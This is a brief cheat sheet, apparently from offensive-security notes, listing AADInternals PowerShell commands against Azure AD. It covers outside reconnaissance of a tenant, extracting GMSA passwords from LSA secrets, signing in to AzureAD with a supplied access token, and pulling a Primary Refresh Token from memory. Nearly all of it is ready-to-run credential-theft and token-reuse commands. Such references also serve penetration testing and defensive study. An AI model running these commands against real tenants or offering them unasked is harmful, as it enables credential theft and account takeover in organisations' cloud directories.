### Source
https://github.com/Gerenios/AADInternals

### Install and Import
```
Install-Module AADInternals
Import-Module AADInternals.psd1
```

### Gather informations from AzureAD
```
Get-AADIntTenantDomains -Domain <domain>
```

### Gather informations from AzureAD
```
Invoke-AADIntReconAsOutsider -DomainName <tenant>.onmicrosoft.com
```

### Get GMSA password from given user
```
Get-AADIntLSASecrets -AccountName "<domain>\<user>"
```

### Use AAD Graph token
```
Connect-AzureAD -AccountId <user>@<tenant>.onmicrosoft.com -AadAccessToken <token>
```

### Retreive Primary Refresh Token from memory
```
Get-AADIntUserPRTToken
```

